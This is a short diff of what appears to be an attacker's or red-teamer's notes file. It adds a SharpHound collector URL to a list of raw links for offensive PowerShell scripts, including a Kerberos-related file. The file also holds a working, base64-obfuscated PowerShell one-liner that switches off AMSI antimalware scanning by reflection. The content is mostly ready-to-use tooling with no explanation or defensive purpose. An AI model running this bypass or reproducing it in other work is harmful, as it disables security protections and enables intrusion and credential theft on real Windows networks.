@@ -10,6 +10,8 @@ https://gist.githubusercontent.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f/ra
 
 https://raw.githubusercontent.com/vinicius-batistella/Rumo/refs/heads/main/kerb.txt
 
+https://raw.githubusercontent.com/BloodHoundAD/BloodHound/refs/heads/master/Collectors/SharpHound.ps1
+
 ==============================================================================================================================
 
 [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
